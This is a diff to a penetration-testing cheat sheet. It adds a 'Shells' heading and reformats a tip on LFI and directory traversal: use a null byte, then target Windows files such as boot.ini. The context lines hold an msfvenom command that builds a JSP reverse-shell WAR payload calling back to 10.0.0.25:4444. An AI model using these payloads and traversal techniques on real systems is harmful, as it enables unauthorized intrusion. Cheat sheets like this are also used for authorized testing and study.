@@ -781,6 +781,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 ``` /usr/share/seclists/Fuzzing```
 ``` /usr/share/wfuzz/wordlist```
 
+# Shells
+
 #### Shell Spawning
 ```
 which python; which python3
@@ -853,12 +855,13 @@ fasttrack.lst and the enumd username variations as password.
 - Speak the language the machine wants to, not what is convenient.
 
 
-Interesting files to look for via LFI/Traversal (REMEMBER TO USE nullbyte ‘%00’ to
-terminate serverside for LFI)
+Interesting files to look for via LFI/Traversal (REMEMBER TO USE nullbyte ```%00``` to terminate serverside for LFI)
+
 #### Windows
-- ```C:\boot.ini```
-- ```WINDOWS\System32\drivers\etc\hosts```
-- ```WINDOWS/system32/prodspec.ini```
+```C:\boot.ini
+WINDOWS\System32\drivers\etc\hosts
+WINDOWS/system32/prodspec.ini
+```
 
 # Essential Reading
 
